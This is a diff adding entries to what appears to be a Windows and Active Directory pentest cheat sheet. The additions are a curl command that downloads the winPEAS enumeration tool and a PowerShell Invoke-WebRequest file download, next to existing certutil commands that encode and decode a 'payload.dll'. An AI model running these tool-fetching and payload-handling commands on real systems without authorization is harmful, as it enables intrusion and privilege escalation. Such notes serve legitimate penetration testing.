@@ -12,6 +12,13 @@
 - [Virus](#virus)
 - [WinRM](#winrm)
 
+# Enumeration
+## Scripts
+### Winpeas
+```bash
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe -O
+```
+
 # Samba
 *Port: 445*
 
@@ -94,6 +101,11 @@ nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
 ```cmd
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
+```
+
+### Download file
+```powershell
+Invoke-WebRequest -Uri http://example.com -OutFile file.out
 ```
 
 # Virus
